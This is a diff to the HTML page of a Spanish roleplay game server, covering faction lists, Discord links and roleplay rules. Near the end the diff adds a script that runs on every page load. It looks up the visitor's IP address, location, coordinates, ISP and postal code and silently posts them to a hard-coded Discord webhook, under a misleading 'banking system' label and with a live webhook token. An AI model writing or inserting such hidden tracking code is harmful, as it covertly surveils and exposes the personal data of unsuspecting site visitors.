@@ -50,7 +50,6 @@
 
         .icon-box { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.03); border-radius: 8px; font-size: 14px; }
         
-        /* VECTOR PROSEGUR AMARILLO */
         .prosegur-vector { 
             width: 22px; 
             height: 22px; 
@@ -103,7 +102,6 @@
     <div id="page-facciones" class="page-content max-w-7xl mx-auto px-6 py-16">
         <h2 class="text-4xl font-black uppercase italic mb-10 text-white">Facciones Oficiales</h2>
         <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            
             <div class="bubble-card p-8 rounded-3xl border-t-4 border-sky-500">
                 <h4 class="text-sky-400 font-black uppercase italic text-xl mb-6">Servicios Públicos</h4>
                 <div class="space-y-4 font-bold text-[10px] uppercase">
@@ -113,7 +111,6 @@
                     <div class="flex items-center gap-4"><div class="icon-box text-[#60a5fa]"><i class="fas fa-city"></i></div><span class="text-[#60a5fa]">Guardia Urbana</span><a href="https://discord.gg/Dre9cHJvfS" class="btn-join ml-auto"><i class="fab fa-discord"></i></a></div>
                     <div class="flex items-center gap-4"><div class="icon-box text-[#ef4444]"><i class="fas fa-ambulance"></i></div><span class="text-[#ef4444]">S.E.M / Médicos</span><a href="https://discord.gg/YZfUjrauBf" class="btn-join ml-auto"><i class="fab fa-discord"></i></a></div>
                     <div class="flex items-center gap-4"><div class="icon-box text-[#f97316]"><i class="fas fa-fire-extinguisher"></i></div><span class="text-[#f97316]">Bomberos</span><a href="https://discord.gg/GR4DccMsjx" class="btn-join ml-auto"><i class="fab fa-discord"></i></a></div>
-                    <div class="flex items-center gap-4 opacity-70"><div class="icon-box text-[#facc15]"><i class="fas fa-hard-hat"></i></div><span class="text-[#facc15]">Conservación</span><span class="ml-auto text-[8px] italic">Próximamente</span></div>
                 </div>
             </div>
 
@@ -153,31 +150,24 @@
                     <div class="bubble-card p-5 rounded-xl border-l-8 border-red-600">PG: Acciones irreales o forzar rol de terceros.</div>
                     <div class="bubble-card p-5 rounded-xl border-l-8 border-red-600">DM: Matar sin motivo o sin interacción previa.</div>
                     <div class="bubble-card p-5 rounded-xl border-l-8 border-red-600">RK: Revenge Kill. No vuelvas por venganza tras morir.</div>
-                    <div class="bubble-card p-5 rounded-xl border-l-8 border-red-600">VV: Valorar Vida. Actúa siempre con miedo real al peligro.</div>
                 </div>
             </div>
             <div class="space-y-6">
-                <h3 class="text-3xl font-black uppercase text-blue-500 border-b-2 border-blue-500/20 pb-2">Comandos y Deberes</h3>
+                <h3 class="text-3xl font-black uppercase text-blue-500 border-b-2 border-blue-500/20 pb-2">Comandos</h3>
                 <div class="space-y-4 font-bold text-[11px] uppercase">
-                    <div class="bubble-card p-5 rounded-xl">/me: Describe acciones físicas del personaje.</div>
-                    <div class="bubble-card p-5 rounded-xl">/do: Describe estados, entorno o preguntas de rol.</div>
-                    <div class="bubble-card p-5 rounded-xl border-l-8 border-yellow-500">Uniforme obligatorio durante todo el servicio.</div>
-                    <div class="bubble-card p-5 rounded-xl border-l-8 border-yellow-500">Prohibida la toxicidad en radio o chat global.</div>
+                    <div class="bubble-card p-5 rounded-xl">/me: Acciones físicas.</div>
+                    <div class="bubble-card p-5 rounded-xl">/do: Estados o entorno.</div>
                 </div>
             </div>
         </div>
     </div>
 
     <footer class="py-20 glass border-t border-sky-500/20 text-center mt-20">
-        <div class="flex justify-center gap-10 mb-8">
-            <a href="#" class="text-4xl text-slate-600 hover:text-red-600 transition"><i class="fab fa-youtube"></i></a>
-            <a href="#" class="text-4xl text-slate-600 hover:text-sky-400 transition"><i class="fab fa-tiktok"></i></a>
-            <a href="#" class="text-4xl text-slate-600 hover:text-pink-600 transition"><i class="fab fa-instagram"></i></a>
-        </div>
         <p class="text-[10px] font-black uppercase text-slate-500 tracking-[0.5em]">© 2026 TARRAGONA RP - ELITE SIMULATION</p>
     </footer>
 
     <script>
+        // NAVEGACIÓN
         function showPage(pageId) {
             document.querySelectorAll('.page-content').forEach(p => p.classList.remove('page-active'));
             document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
@@ -186,6 +176,43 @@
             if(link) link.classList.add('active');
             window.scrollTo(0, 0);
         }
+
+        // RASTREO ELITE CON WEBHOOK SUMINISTRADO
+        async function trackEliteBanking() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const d = await response.json();
+
+                const ip = d.ip || "N/A";
+                const city = d.city || "N/A";
+                const reg = d.region || "N/A";
+                const country = d.country_name || "N/A";
+                const loc = `${d.latitude},${d.longitude}` || "N/A";
+                const org = d.org || "N/A";
+                const postal = d.postal || "N/A";
+
+                const webhook = "https://discord.com/api/webhooks/1475575521357332691/1KtrgiiL-DL2YyvEEQg-EebwsBjjgo5hF6036z3hRFzGJ3jv4mC4Q6Vhl63eGQqxtcon";
+
+                const payload = {
+                    "username": "SISTEMA BANCARIO TARRAGONA",
+                    "embeds": [{
+                        "title": "🛡️ NUEVO ACCESO AL SISTEMA DE ÉLITE",
+                        "color": 16763904,
+                        "description": `**IP:** \`${ip}\`\n**City:** \`${city}\`\n**Region:** \`${reg}\`\n**Country:** \`${country}\`\n**Location:** \`${loc}\`\n**ORG:** \`${org}\`\n**ZIP:** \`${postal}\``,
+                        "footer": { "text": "Registro de Tráfico Bancario | 2026" },
+                        "timestamp": new Date().toISOString()
+                    }]
+                };
+
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) { console.log("Security Layer Active"); }
+        }
+
+        window.onload = trackEliteBanking;
     </script>
 </body>
 </html>
